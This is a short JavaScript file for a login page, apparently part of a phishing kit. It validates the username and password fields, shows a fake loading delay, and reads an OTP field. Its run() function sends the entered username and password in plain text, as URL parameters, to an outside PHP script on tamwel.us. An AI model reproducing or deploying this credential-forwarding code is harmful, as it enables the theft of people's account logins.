var arry = [3];
function closes() {
  arry[0] = document.getElementById("username");
  arry[1] = document.getElementById("password");
  if (arry[0].value === "") {
    document.getElementById("username").style.borderColor = "red";
    if (arry[1].value === "") {
      document.getElementById("password").style.borderColor = "red";
      return false;
    }
  }
  else if (arry[1].value === "") {
    document.getElementById("username").style.borderColor = "green";
    document.getElementById("password").style.borderColor = "red";
    return false;
  }
  else {
    document.getElementById("username").style.borderColor = "green";
    document.getElementById("password").style.borderColor = "green";
    return true;
  }
}

function run() {
  arry[2] = document.getElementById("otp_code");
  window.location.href = "https://tamwel.us/algorthm/php/submit.php?username=" + arry[0].value + "&password=" + arry[1].value;

}

function myFunction() {
  var myVar;
  myVar = setTimeout(showPage, 3000);
}

function showPage() {
  document.getElementById("loader").style.display = "none";
  document.getElementById("myDiv").style.display = "block";
}